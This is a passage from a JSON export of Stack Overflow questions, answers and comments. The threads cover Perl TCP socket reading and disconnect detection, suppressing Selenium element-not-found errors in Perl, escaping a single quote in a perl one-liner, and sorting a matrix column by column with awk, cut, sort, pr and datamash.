"edited": false, "score": 0, "creation_date": 1520638706, "post_id": 49190201, "comment_id": 85412908, "body": "thankyou! This helps fill in some of the gaps I had. I can&#39;t recall now why I had discounted the perldoc page on sysread func itself. I think I was expecting a separate page or document outlining the behavior in the context of sockets/ipc."}], "tags": [], "owner": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "is_accepted": true, "score": 6, "last_activity_date": 1520629040, "last_edit_date": 1520629040, "creation_date": 1520586671, "answer_id": 49190201, "question_id": 49189467, "link": "https://stackoverflow.com/questions/49189467/perl-and-server-client-sockets/49190201#49190201", "title": "Perl and server-client sockets", "body": "<blockquote>\n  <p>And its possible (recommended ? yes/no?) to do a functional call on the socket if something isn't available via the OO modules...</p>\n</blockquote>\n\n<p>I'm not sure which functional calls you refer to which are not available in IO::Socket. But in general IO::Socket objects are also normal file handles. This means you can do things like <code>$server-&gt;accept</code> but also <code>accept($server)</code>. </p>\n\n<blockquote>\n  <p>Problem 1. The far-side/peer has disconnected / the socket is no longer ESTABLISHED?</p>\n</blockquote>\n\n<p>This problem is not specific to Perl but how <a href=\"http://www.manpages.info/linux/select.2.html\" rel=\"nofollow noreferrer\">select</a> and the socket API work in general. Perl does not add its own behavior in this regard. In general: If the peer has closed the connection then <code>select</code> will show that the socket is available for read and if one does a read on the socket it will return no data and no error - which means that no more data are available to read from the peer since the peer has properly closed its side of the connection (connection close is not considered an error but normal behavior). Note that it is possible within TCP to still send data to the peer even if the peer has indicated that it will not send any more data. </p>\n\n<blockquote>\n  <p>Problem 2. Is there data available to read?</p>\n</blockquote>\n\n<p><code>sysread</code> and <code>recv</code> are different the same as <code>read</code> and <code>recv</code>/<code>recvmsg</code> or different in the underlying libc. Specifically <code>recv</code> can have flags which for example allow peeking into data available in the systems socket buffer without reading the data. See the <a href=\"http://man7.org/linux/man-pages/man2/recv.2.html\" rel=\"nofollow noreferrer\">the documentation</a> for more information.</p>\n\n<p>I would recommend to use <code>sysread</code> instead of <code>recv</code> since the behavior of <code>sysread</code> can be redefined when <a href=\"https://perldoc.perl.org/Tie/Handle.html\" rel=\"nofollow noreferrer\">tying a file handle</a> while the behavior of <code>recv</code> cannot. And tying the file handle is for example done by <a href=\"https://metacpan.org/pod/IO::Socket::SSL\" rel=\"nofollow noreferrer\">IO::Socket::SSL</a> so that not the data from the underlying OS socket are returned but the decrypted data from the SSL socket.</p>\n\n<blockquote>\n  <p>From other C and Java doco pages, I gather there is a convention of returning undef, 0, >0, and on some implementations -1 when doing the equivalent of sysread. Is there an official perl spec someone can link me to that describes what Perl has implemented? </p>\n</blockquote>\n\n<p>The behavior of <code>sysread</code> is well documented. To cite from what you get when using <code>perldoc -f sysread</code>:</p>\n\n<blockquote>\n  <p>... Returns the number of bytes\n              actually read, 0 at end of file, or undef if there was an error\n              (in the latter case $! is also set).</p>\n</blockquote>\n\n<p>Apart from that, you state your problem as <em>Is there data available to read?</em> but then you only talk about <code>sysread</code> and <code>recv</code> and not how to check if data is available before calling these functions. I assume that you are using <code>select</code> (or IO::Select, which is just a wrapper) to do this. While <code>can_read</code> of IO::Select can be used to get the information in most cases it will return the information only from the underlying OS socket. With plain sockets this is enough but for example when using SSL there is some internal buffering done in the SSL stack and <code>can_read</code> might return false even though there are still data available to read in the buffer. See <a href=\"https://metacpan.org/pod/IO::Socket::SSL#Common-Usage-Errors\" rel=\"nofollow noreferrer\">Common Usage Errors: Polling of SSL sockets</a> on how to handle this properly.</p>\n"}], "owner": {"reputation": 125, "user_id": 1934262, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/4ceac2ce6ef515945bd020498a10d5dd?s=128&d=identicon&r=PG", "display_name": "sparco1500", "link": "https://stackoverflow.com/users/1934262/sparco1500"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 442, "favorite_count": 0, "accepted_answer_id": 49190201, "answer_count": 1, "score": 2, "last_activity_date": 1520629040, "creation_date": 1520583987, "question_id": 49189467, "link": "https://stackoverflow.com/questions/49189467/perl-and-server-client-sockets", "title": "Perl and server-client sockets", "body": "<p><strong>Background/Context</strong></p>\n\n<p>I have a two scripts, a server-side script that can handle multiple clients, and a client-side script that connects to the server.  Any of the clients that send a message to the server have that message copied/echoed to all the other connected clients.</p>\n\n<hr>\n\n<p><strong>Where I'm stuck.</strong></p>\n\n<p>This afternoon, I have been grasping at thin air searching for a thorough explanation with examples covering all that there is for Perl and TCP sockets. A surprising large number of results from google still list articles from 2007-2012 .  It appears there originally there was the 'Socket' module , and over time IO::Socket was added , then IO::Select. But the Perldoc pages don't cover or reference everything in one place, or provide sufficent cross referencing links. I gather that most of the raw calls in Socket have an equivalent in IO::Socket. And its possible (recommended ? yes/no?) to do a functional call on the socket if something isn't available via the OO modules...</p>\n\n<p><strong>Problem 1. The far-side/peer has disconnected / the socket is no longer ESTABLISHED?</strong> </p>\n\n<p>I have been trying everything I ran across today, including IO::Select with calls to can_read, has_exception, but the outputs from these show no differences regardless if the socket is up or down - I confirmed from netstat output that the non-blocking socket is torn down instantly by the OS (MacOS).</p>\n\n<p><strong>Problem 2. Is there data available to read?</strong></p>\n\n<p>For my previous perl client scripts, I have rolled my own method of using sysread (<a href=\"https://perldoc.perl.org/functions/sysread.html\" rel=\"nofollow noreferrer\">https://perldoc.perl.org/functions/sysread.html</a>) , but today I noticed that <code>recv</code> is listed within the synopsis on this page near the top <a href=\"https://perldoc.perl.org/IO/Socket.html\" rel=\"nofollow noreferrer\">https://perldoc.perl.org/IO/Socket.html</a> , but there is no mention of the recv method in the detailed info below... </p>\n\n<p>From other C and Java doco pages, I gather there is a convention of returning undef, 0, >0, and on some implementations -1 when doing the equivalent of <code>sysread</code>.  Is there an official perl spec someone can link me to that describes what Perl has implemented? Is sysread or recv the 'right' way to be reading from TCP sockets in the first place?</p>\n\n<p>I haven't provided my code here because I'm asking from a 'best-practices' point of view, what is the 'right' way to do client-server communication?  Is polling even the right way to begin with? Is there an event-driven method that I've somehow missed.. </p>\n\n<p>My sincere apologies if what I've asked for is already available, but google keeps giving me the same old result pages and derivative blogs/articles that I've already read.  </p>\n\n<p>Many thanks in advance.</p>\n"}, {"tags": ["perl", "selenium", "selenium-webdriver", "coercion"], "comments": [{"owner": {"reputation": 791, "user_id": 6320173, "user_type": "registered", "accept_rate": 77, "profile_image": "https://i.stack.imgur.com/tEaev.png?s=128&g=1", "display_name": "Frank", "link": "https://stackoverflow.com/users/6320173/frank"}, "edited": false, "score": 0, "creation_date": 1520582498, "post_id": 49188957, "comment_id": 85383400, "body": "When there is no code in the catch block nothing will be executed and no message will be printed, is that solving your problem?"}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1520582714, "post_id": 49188957, "comment_id": 85383492, "body": "The code seems wrong: There&#39;s no matching single quote for <code>).&quot;&#39;)]&quot;)</code>"}, {"owner": {"reputation": 981, "user_id": 7019069, "user_type": "registered", "accept_rate": 65, "profile_image": "https://i.stack.imgur.com/SQoGB.jpg?s=128&g=1", "display_name": "nck", "link": "https://stackoverflow.com/users/7019069/nck"}, "reply_to_user": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1520583122, "post_id": 49188957, "comment_id": 85383639, "body": "@choroba sorry, I made a mistake while translating my code to the question."}, {"owner": {"reputation": 981, "user_id": 7019069, "user_type": "registered", "accept_rate": 65, "profile_image": "https://i.stack.imgur.com/SQoGB.jpg?s=128&g=1", "display_name": "nck", "link": "https://stackoverflow.com/users/7019069/nck"}, "reply_to_user": {"reputation": 791, "user_id": 6320173, "user_type": "registered", "accept_rate": 77, "profile_image": "https://i.stack.imgur.com/tEaev.png?s=128&g=1", "display_name": "Frank", "link": "https://stackoverflow.com/users/6320173/frank"}, "edited": false, "score": 0, "creation_date": 1520583849, "post_id": 49188957, "comment_id": 85383997, "body": "@Frank I have to try again but I THINK it does still show the error when the code isside the try block without catch. This would still be a patch if it works, but is not &quot;elegant&quot; at all."}, {"owner": {"reputation": 791, "user_id": 6320173, "user_type": "registered", "accept_rate": 77, "profile_image": "https://i.stack.imgur.com/tEaev.png?s=128&g=1", "display_name": "Frank", "link": "https://stackoverflow.com/users/6320173/frank"}, "edited": false, "score": 0, "creation_date": 1520584135, "post_id": 49188957, "comment_id": 85384157, "body": "There must be a catch block but without any code inside this catch block."}, {"owner": {"reputation": 981, "user_id": 7019069, "user_type": "registered", "accept_rate": 65, "profile_image": "https://i.stack.imgur.com/SQoGB.jpg?s=128&g=1", "display_name": "nck", "link": "https://stackoverflow.com/users/7019069/nck"}, "reply_to_user": {"reputation": 791, "user_id": 6320173, "user_type": "registered", "accept_rate": 77, "profile_image": "https://i.stack.imgur.com/tEaev.png?s=128&g=1", "display_name": "Frank", "link": "https://stackoverflow.com/users/6320173/frank"}, "edited": false, "score": 0, "creation_date": 1520588799, "post_id": 49188957, "comment_id": 85386619, "body": "@Frank I just tried and I still get the same error when I put the wait_until inside the try, catch with no code in the catch."}, {"owner": {"reputation": 791, "user_id": 6320173, "user_type": "registered", "accept_rate": 77, "profile_image": "https://i.stack.imgur.com/tEaev.png?s=128&g=1", "display_name": "Frank", "link": "https://stackoverflow.com/users/6320173/frank"}, "edited": false, "score": 0, "creation_date": 1520591592, "post_id": 49188957, "comment_id": 85388413, "body": "What exception are you catching? When you put  a write statement in your catch block is it given any output when running the program. If not I&#39;m afraid that this not an exception you can catch."}, {"owner": {"reputation": 981, "user_id": 7019069, "user_type": "registered", "accept_rate": 65, "profile_image": "https://i.stack.imgur.com/SQoGB.jpg?s=128&g=1", "display_name": "nck", "link": "https://stackoverflow.com/users/7019069/nck"}, "reply_to_user": {"reputation": 791, "user_id": 6320173, "user_type": "registered", "accept_rate": 77, "profile_image": "https://i.stack.imgur.com/tEaev.png?s=128&g=1", "display_name": "Frank", "link": "https://stackoverflow.com/users/6320173/frank"}, "edited": false, "score": 0, "creation_date": 1520600677, "post_id": 49188957, "comment_id": 85393481, "body": "@Frank, I just tried and editted the question with the results. It doesn&#39;t print the catch"}], "answers": [{"comments": [{"owner": {"reputation": 981, "user_id": 7019069, "user_type": "registered", "accept_rate": 65, "profile_image": "https://i.stack.imgur.com/SQoGB.jpg?s=128&g=1", "display_name": "nck", "link": "https://stackoverflow.com/users/7019069/nck"}, "edited": false, "score": 0, "creation_date": 1520600052, "post_id": 49192398, "comment_id": 85393065, "body": "@DabanjaB I just added a working example code to show the problem. I just wrote that as an example to illustrate the problem, I didn&#39;t check the errors."}], "tags": [], "owner": {"reputation": 116505, "user_id": 7429447, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/5a25589e600c8ae89717c14e51a6754b?s=128&d=identicon&r=PG&f=1", "display_name": "DebanjanB", "link": "https://stackoverflow.com/users/7429447/debanjanb"}, "is_accepted": false, "score": 0, "last_activity_date": 1520593665, "creation_date": 1520593665, "answer_id": 49192398, "question_id": 49188957, "link": "https://stackoverflow.com/questions/49188957/how-can-i-escape-an-element-not-found-in-selenium-from-perl/49192398#49192398", "title": "How can I escape an element not found in selenium from perl?", "body": "<p>As per the current code block and all the revisions ofcoarse you need to change <code>$itle</code> to <strong>$title</strong> and possibly <code>$titleeq</code> to <strong>$title eq</strong> as follows :</p>\n\n<p>use Selenium::Waiter qw/wait_until/;</p>\n\n<pre><code>my $title=\"\";\nwait_until{$title=($driver-&gt;find_element(\"//span[contains(\\@id,'id_blue'))]\")-&gt;get_text()}timeout =&gt; 1;\nif ($title eq \"\"){ #It'S not blue\n    wait_until{$title=($driver-&gt;find_element(\"//span[contains(\\@id,'id_red')]\")&gt;get_text()}timeout =&gt; 1;    \n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 981, "user_id": 7019069, "user_type": "registered", "accept_rate": 65, "profile_image": "https://i.stack.imgur.com/SQoGB.jpg?s=128&g=1", "display_name": "nck", "link": "https://stackoverflow.com/users/7019069/nck"}, "is_accepted": true, "score": 1, "last_activity_date": 1520603934, "creation_date": 1520603934, "answer_id": 49195412, "question_id": 49188957, "link": "https://stackoverflow.com/questions/49188957/how-can-i-escape-an-element-not-found-in-selenium-from-perl/49195412#49195412", "title": "How can I escape an element not found in selenium from perl?", "body": "<p>I've found a \"solution\", which isn't clean and short, but does the job, and it's to use find_elements instead of find_element. This returns an empty array and then you can check if it's defined.</p>\n\n<p>I'd love to see another solution as this adds a lot of \"dirty\" code if I have to check a lot of elements.</p>\n\n<p>Example:</p>\n\n<pre><code>my $element_text=\"\";\nmy $myid = \"asdasd\";\nwait_until{$element_text=($driver-&gt;find_elements(\"//span[contains(\\@id,'\".$myid.\"')]\"))[0]}timeout =&gt; 1;                    \nif (!defined($element_text)){$element_text=\"\"}else{$element_text=$element_text-&gt;get_text()};\n</code></pre>\n"}], "owner": {"reputation": 981, "user_id": 7019069, "user_type": "registered", "accept_rate": 65, "profile_image": "https://i.stack.imgur.com/SQoGB.jpg?s=128&g=1", "display_name": "nck", "link": "https://stackoverflow.com/users/7019069/nck"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 185, "favorite_count": 0, "accepted_answer_id": 49195412, "answer_count": 2, "score": 0, "last_activity_date": 1520603934, "creation_date": 1520581726, "last_edit_date": 1520600604, "question_id": 49188957, "link": "https://stackoverflow.com/questions/49188957/how-can-i-escape-an-element-not-found-in-selenium-from-perl", "title": "How can I escape an element not found in selenium from perl?", "body": "<p>I'm writing a code where I access a website whith some elements defined by some ID. Depending on some parameters this elements have a different id. </p>\n\n<p>For example I have a blue web and a red web. All have the same elements, but the id in one is \"title_red\", and in other is \"title_blue\".</p>\n\n<p>I can \"solve\" this, by having a <strong>code like this:</strong></p>\n\n<pre><code>use Selenium::Waiter qw/wait_until/;\n\nmy $title=\"\";\nwait_until{$itle=($driver-&gt;find_element(\"//span[contains(\\@id,'id_blue'))]\")-&gt;get_text()}timeout =&gt; 1;\nif ($titleeq \"\"){ #It'S not blue\n    wait_until{$title=($driver-&gt;find_element(\"//span[contains(\\@id,'id_red')]\")&gt;get_text()}timeout =&gt; 1;    \n}\n</code></pre>\n\n<p>If I don't use the \"wait_until\" the program would just crash after not getting the element. Using it, it kind of does the trick, but it still generates a print exception which is pretty annoying when I'm looking into a lot of elements which are not in the page and makes it really hard to see the rest of the prints in the console. This is the error:</p>\n\n<blockquote>\n  <p>coercion for \"id\" failed: When passing in an object to the WebElement id attribute, it must have at least one of the ELEMENT or element-6066-11e4-a52e-4f735466cecf keys. at (eval 70) line 70.</p>\n</blockquote>\n\n<p>Is there any way to check if the element exists or just hide this prints? I've tried some \"no warnings\" examples but I couldn't get anything to work, and I think this is not a warning, it's an error. If I try it inside a <code>try/catch</code> it would execute the catch.</p>\n\n<p>I've tried this as suggested in the comments and I still get the error:</p>\n\n<pre><code>print \"Here I check if it's fixed:\\n\";\ntry{wait_until{$variable=($driver-&gt;find_element(\"//img[\\@class='\".$other_variable.\"']\"))}timeout=&gt;1}catch{};\n</code></pre>\n\n<p><strong>EDIT</strong>: I just wrote a code to reproduce the problem instead of just writing some lines from my code. The right ID or class may change depending on the region, i'm redirected to google.de:</p>\n\n<pre><code>use Selenium::Chrome;\nuse Selenium::Remote::Driver;\nuse Selenium::Waiter qw/wait_until/;\nuse Try::Tiny;\nuse strict;\nuse warnings;\nuse utf8;\n\nmy $driver = Selenium::Chrome-&gt;new('binary' =&gt; \"C:\\\\chromedriver.exe\"); \n\nmy $login=\"http://google.com\";\n$driver-&gt;get($login); \n\nprint \"Let's try the wrong id:\\n\";\nmy $print_variable =\"\";\nmy $id_not_found = \"something\";\nwait_until{$print_variable=($driver-&gt;find_element(\"//div[\\@class='\".$id_not_found.\"']\"))-&gt;get_text()};  #this produces an error\nprint \"Variable now is: $print_variable\\n\";\n\n$print_variable=\"\";\nprint \"Let's try the right id:\\n\";\nmy $id_found = \"_gIg\";\nwait_until{$print_variable=($driver-&gt;find_element(\"//div[\\@class='\".$id_found.\"']\"))-&gt;get_text()};  #this not\nprint \"Variable now is: $print_variable\\n\";\n\n$print_variable=\"\";\nprint \"Let's try the wrong id with try, catch:\\n\";\ntry{wait_until{$print_variable=($driver-&gt;find_element(\"//div[\\@class='\".$id_not_found.\"']\"))-&gt;get_text()}}catch{};  #this produces an error\nprint \"Variable now is: $print_variable\\n\";\n\n$print_variable=\"\";\nprint \"Let's try the wrong id with try, catch and catch statement:\\n\";\ntry{wait_until{$print_variable=($driver-&gt;find_element(\"//div[\\@class='\".$id_not_found.\"']\"))-&gt;get_text()}}catch{warn \"ERROR: $_\";}; #this produces an error\nprint \"Variable now is: $print_variable\\n\";\n\nsleep(10);\n$driver-&gt;shutdown_binary();\n</code></pre>\n\n<p>And this is the output:</p>\n\n<pre><code>perl example_stack.pl\nLet's try the wrong id:\ncoercion for \"id\" failed: When passing in an object to the WebElement id attribute, it must have at least one of the ELEMENT or element-6066-11e4-a52e-4f735466cecf keys. at (eval 66) line 70.\nVariable now is:\nLet's try the right id:\nVariable now is: Hinweise zum Datenschutz bei Google\nLet's try the wrong id with try, catch:\ncoercion for \"id\" failed: When passing in an object to the WebElement id attribute, it must have at least one of the ELEMENT or element-6066-11e4-a52e-4f735466cecf keys. at (eval 66) line 70.\nVariable now is:\nLet's try the wrong id with try, catch and catch statement:\ncoercion for \"id\" failed: When passing in an object to the WebElement id attribute, it must have at least one of the ELEMENT or element-6066-11e4-a52e-4f735466cecf keys. at (eval 66) line 70.\nVariable now is:\n</code></pre>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 6, "creation_date": 1520579613, "post_id": 49188278, "comment_id": 85382013, "body": "In bash command line you should escape single quote with either <code>&#39;\\&#39;&#39;</code> or <code>&#39;&quot;&#39;&quot;&#39;</code>. For example both <code>echo &#39;A&#39;\\&#39;&#39;B&#39;</code> and <code>echo &#39;A&#39;&quot;&#39;&quot;&#39;B&#39;</code> gives output <code>A&#39;B</code>"}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 3, "creation_date": 1520581742, "post_id": 49188278, "comment_id": 85383007, "body": "In other words, in bash, you can&#39;t escape a single quote inside single quotes; you need to close the single quotes, then add a single quote, and start single quotes again."}], "answers": [{"tags": [], "owner": {"reputation": 48798, "user_id": 223226, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/iGqE4.png?s=128&g=1", "display_name": "mpapec", "link": "https://stackoverflow.com/users/223226/mpapec"}, "is_accepted": false, "score": 4, "last_activity_date": 1520582364, "creation_date": 1520582364, "answer_id": 49189110, "question_id": 49188278, "link": "https://stackoverflow.com/questions/49188278/i-am-using-perl-one-liner-for-search-replace-i-want-to-replace-string-with/49189110#49189110", "title": "I am using perl one liner for search replace. I want to replace string with &#39;", "body": "<p>If you want to avoid shell escape hell, you can use <code>\\x27</code> instead of <code>'</code></p>\n\n<pre><code>perl -p -i -e 's/assume/assume 3\\x27;/g'\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 9466131, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/58368ee889ea994f55f78cb59e083ed4?s=128&d=identicon&r=PG&f=1", "display_name": "kmahi", "link": "https://stackoverflow.com/users/9466131/kmahi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 87, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1520582391, "creation_date": 1520579051, "last_edit_date": 1520582391, "question_id": 49188278, "link": "https://stackoverflow.com/questions/49188278/i-am-using-perl-one-liner-for-search-replace-i-want-to-replace-string-with", "title": "I am using perl one liner for search replace. I want to replace string with &#39;", "body": "<p>I want to replace string with ' but it is not working. </p>\n\n<pre><code>perl -p -i -e 's/assume/assume 3\\';/g' abcd \n</code></pre>\n\n<p>It gives error : <code>Unmatched '</code>.</p>\n"}, {"tags": ["linux", "bash", "perl", "awk"], "comments": [{"owner": {"reputation": 82953, "user_id": 608639, "user_type": "registered", "accept_rate": 64, "profile_image": "https://i.stack.imgur.com/aPIhh.jpg?s=128&g=1", "display_name": "jww", "link": "https://stackoverflow.com/users/608639/jww"}, "edited": false, "score": 1, "creation_date": 1520566549, "post_id": 49185119, "comment_id": 85377886, "body": "Stack Overflow is not a code writing service. Please show your code. Since Stack Overflow hides the Close reason from you: <i>Questions seeking debugging help (&quot;why isn&#39;t this code working?&quot;) must include the desired behavior, a specific problem or error and the shortest code necessary to reproduce it in the question itself. Questions without a clear problem statement are not useful to other readers. See: <a href=\"http://stackoverflow.com/help/\">How to create a Minimal, Complete, and Verifiable example</a>.</i>"}, {"owner": {"reputation": 11092, "user_id": 8794221, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81e2de0a8497383ad1889e87d91adc91?s=128&d=identicon&r=PG&f=1", "display_name": "Allan", "link": "https://stackoverflow.com/users/8794221/allan"}, "edited": false, "score": 0, "creation_date": 1520584356, "post_id": 49185119, "comment_id": 85384254, "body": "Advice to newcomers: If an answer solves your problem,  please accept it by clicking the large check mark (\u2713) next to it and optionally also up-vote it  (up-voting requires at least 15 reputation points).  If you found other answers helpful, please up-vote them. Accepting and up-voting helps future readers.  Please see [the relevant help-center article][1] [1]: <a href=\"http://stackoverflow.com/help/someone-answers\">stackoverflow.com/help/someone-answers</a>"}], "answers": [{"comments": [{"owner": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "edited": false, "score": 0, "creation_date": 1520571667, "post_id": 49185324, "comment_id": 85379056, "body": "You should mention thats gawk-only for asort()."}, {"owner": {"reputation": 25, "user_id": 9460698, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/27e012cb7ac752af8c6c25c9af0d971c?s=128&d=identicon&r=PG&f=1", "display_name": "Y. Du", "link": "https://stackoverflow.com/users/9460698/y-du"}, "edited": false, "score": 0, "creation_date": 1520580925, "post_id": 49185324, "comment_id": 85382577, "body": "@karakfa: Thanks a lot. Your solution works well in this 3*4 data array, but what if I have a data with a size of n*m?"}, {"owner": {"reputation": 62252, "user_id": 1435869, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TrEd9.jpg?s=128&g=1", "display_name": "karakfa", "link": "https://stackoverflow.com/users/1435869/karakfa"}, "edited": false, "score": 0, "creation_date": 1520600379, "post_id": 49185324, "comment_id": 85393275, "body": "I would write a script writing script, that will produce this for m columns, row count doesn&#39;t matter."}], "tags": [], "owner": {"reputation": 62252, "user_id": 1435869, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TrEd9.jpg?s=128&g=1", "display_name": "karakfa", "link": "https://stackoverflow.com/users/1435869/karakfa"}, "is_accepted": false, "score": 0, "last_activity_date": 1520586645, "last_edit_date": 1520586645, "creation_date": 1520559452, "answer_id": 49185324, "question_id": 49185119, "link": "https://stackoverflow.com/questions/49185119/how-to-sort-a-group-of-data-in-a-columnwise-manner/49185324#49185324", "title": "How to sort a group of data in a columnwise manner?", "body": "<p><code>awk</code> to the rescue!!</p>\n\n<pre><code>awk '{f1[NR]=$1; f2[NR]=$2; f3[NR]=$3; f4[NR]=$4} \n  END{asort(f1); asort(f2); asort(f3); asort(f4); \n      for(i=1;i&lt;=NR;i++) print f1[i],f2[i],f3[i],f4[i]}' file\n\n1 2 4 3\n3 6 9 16\n5 7 20 22\n</code></pre>\n\n<p>there may a smarter way of doing this as well...</p>\n"}, {"comments": [{"owner": {"reputation": 18548, "user_id": 4082052, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GUNps.jpg?s=128&g=1", "display_name": "Sundeep", "link": "https://stackoverflow.com/users/4082052/sundeep"}, "edited": false, "score": 1, "creation_date": 1520569276, "post_id": 49185941, "comment_id": 85378487, "body": "could split the code in multiple lines to make it easier to read :) also, you can use <code>pr</code> instead of <code>paste</code>, it allows numeric argument.. for ex: <code>pr -3ats</code>"}, {"owner": {"reputation": 18548, "user_id": 4082052, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GUNps.jpg?s=128&g=1", "display_name": "Sundeep", "link": "https://stackoverflow.com/users/4082052/sundeep"}, "edited": false, "score": 0, "creation_date": 1520571732, "post_id": 49185941, "comment_id": 85379078, "body": "check out <a href=\"https://unix.stackexchange.com/questions/308631/how-to-process-a-multi-column-text-file-to-get-another-multi-column-text-file\" title=\"how to process a multi column text file to get another multi column text file\">unix.stackexchange.com/questions/308631/&hellip;</a> as well"}, {"owner": {"reputation": 18548, "user_id": 4082052, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GUNps.jpg?s=128&g=1", "display_name": "Sundeep", "link": "https://stackoverflow.com/users/4082052/sundeep"}, "edited": false, "score": 0, "creation_date": 1520571885, "post_id": 49185941, "comment_id": 85379127, "body": "and just realized, you could avoid datamash altogether by using <code>pr -${col}ts</code>"}, {"owner": {"reputation": 11092, "user_id": 8794221, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81e2de0a8497383ad1889e87d91adc91?s=128&d=identicon&r=PG&f=1", "display_name": "Allan", "link": "https://stackoverflow.com/users/8794221/allan"}, "reply_to_user": {"reputation": 25, "user_id": 9460698, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/27e012cb7ac752af8c6c25c9af0d971c?s=128&d=identicon&r=PG&f=1", "display_name": "Y. Du", "link": "https://stackoverflow.com/users/9460698/y-du"}, "edited": false, "score": 0, "creation_date": 1520586262, "post_id": 49185941, "comment_id": 85385208, "body": "@Y.Du: could you also <code>vote up</code> my answer? For your other question:  <a href=\"https://stackoverflow.com/questions/49169847/how-to-subtract-a-value-with-a-column-of-values\" title=\"how to subtract a value with a column of values\">stackoverflow.com/questions/49169847/&hellip;</a> it is currently in <code>hold</code> status so I can&#39;t answer it :("}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1520595236, "post_id": 49185941, "comment_id": 85390367, "body": "@Allan: <b><i>Please don&#39;t ask people to up vote your posts</i></b>"}], "tags": [], "owner": {"reputation": 11092, "user_id": 8794221, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81e2de0a8497383ad1889e87d91adc91?s=128&d=identicon&r=PG&f=1", "display_name": "Allan", "link": "https://stackoverflow.com/users/8794221/allan"}, "is_accepted": true, "score": 0, "last_activity_date": 1520584244, "last_edit_date": 1520584244, "creation_date": 1520564570, "answer_id": 49185941, "question_id": 49185119, "link": "https://stackoverflow.com/questions/49185119/how-to-sort-a-group-of-data-in-a-columnwise-manner/49185941#49185941", "title": "How to sort a group of data in a columnwise manner?", "body": "<p>Let me introduce a flexible solution using <code>cut</code> and <code>sort</code> that you can use on any <code>M,N</code> size tab delimited input matrix.</p>\n\n<pre><code>$ cat -vTE data_to_sort.in \n3^I6^I9^I22$\n5^I2^I4^I3$\n1^I7^I20^I16$\n\n$ col=4; line=3; \n$ for i in $(seq ${col}); do cut -f$i data_to_sort.in |\\\n&gt; sort -n; done | paste $(for i in $(seq ${line}); do echo -n \"- \"; done) |\\\n&gt; datamash transpose\n1       2       4       3\n3       6       9       16\n5       7       20      22\n</code></pre>\n\n<p>If the input file is not <code>\\t</code> delimited you need to define proper delimiter to using <code>-d\"$DELIM_CHAR\"</code> have the cut working properly.</p>\n\n<ul>\n<li><code>for i in $(seq ${col}); do cut -f$i data_to_sort.in | sort -n; done</code> will separate each column of the file and sort it</li>\n<li><code>paste $(for i in $(seq ${line}); do echo -n \"- \"; done)</code> the paste column will then recreate a matrix structure</li>\n<li><code>datamash transpose</code> is needed to transpose the intermediate matrix</li>\n</ul>\n\n<p>Thanks to the feedback from <strong>Sundeep</strong>, let me introduce to you a <strong>better</strong> solution using <code>pr</code> instead of <code>paste</code> command to generate the columns:</p>\n\n<pre><code>$ col=4; line=3 \n$ for i in $(seq ${col}); do cut -f$i data_to_sort.in |\\\n&gt; sort -n; done | pr -${line}ats | datamash transpose\n</code></pre>\n\n<p>Last but not least, </p>\n\n<pre><code>$ col=4; for i in $(seq ${col}); do cut -f$i data_to_sort.in |\\\n&gt; sort -n; done | pr -${col}ts                                                    \n1       2       4       3\n3       6       9       16\n5       7       20      22\n</code></pre>\n\n<p>The following solution will allow us to not use datamash at all!!!</p>\n\n<p>(many thanks to <strong>Sundeep</strong>)</p>\n\n<p><strong>Proof that is working for the skeptics and the 